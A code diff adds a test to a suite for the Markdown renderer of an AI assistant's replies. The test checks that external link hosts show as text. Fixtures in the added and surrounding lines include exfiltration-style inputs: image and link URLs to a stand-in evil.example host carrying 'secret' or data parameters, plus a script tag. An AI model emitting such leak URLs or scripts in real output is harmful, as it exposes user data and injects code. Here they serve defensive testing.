@@ -53,6 +53,14 @@ describe("the assistant's Markdown", () => {
     expect(el.textContent).toContain("plain");
   });
 
+  it("shows the host of an external link as text beside it, never for the admin's own pages", () => {
+    const el = render("[Open dashboard](https://Evil.Example/c?d=x), [de1](/nodes/nod_1) and [docs](https://mistgate.app/guide/).");
+    const hosts = [...el.querySelectorAll("[data-link-host]")];
+    expect(hosts.map((h) => h.textContent)).toEqual(["evil.example", "mistgate.app"]);
+    expect(el.querySelector("a[data-internal]")?.nextElementSibling?.hasAttribute("data-link-host")).toBeFalsy();
+    expect(hosts[0]?.previousElementSibling?.getAttribute("href")).toBe("https://evil.example/c?d=x");
+  });
+
   it("never renders HTML or images from the text", () => {
     const el = render('<img src="https://evil.example/x.png?d=secret"> ![leak](https://evil.example/p.png) <script>alert(1)</script>');
     expect(el.querySelector("img")).toBeNull();
